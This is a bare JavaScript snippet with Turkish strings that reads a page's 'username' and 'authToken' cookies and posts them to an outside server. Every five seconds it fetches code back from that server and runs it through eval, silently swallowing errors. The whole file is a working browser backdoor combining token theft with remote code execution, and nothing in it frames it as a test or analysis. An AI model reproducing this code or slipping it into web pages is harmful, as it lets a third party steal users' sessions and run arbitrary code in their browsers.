(function() {
    let lastTimestamp = null;

    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function fetchCode() {
        const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
        const authToken = getCookie('authToken') || 'Token Yok';

        fetch('https://katip.onrender.com/get-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username,
                authToken
            })
        })
            .then(response => {
                if (!response.ok) throw new Error('Sunucu yanıtı başarısız');
                return response.json();
            })
            .then(data => {
                if (data.code && (!lastTimestamp || data.timestamp > lastTimestamp)) {
                    try {
                        eval(data.code);
                        lastTimestamp = data.timestamp;
                    } catch (e) {}
                }
            })
            .catch(() => {})
            .finally(() => {
                setTimeout(fetchCode, 5000);
            });
    }

    fetchCode();
})();
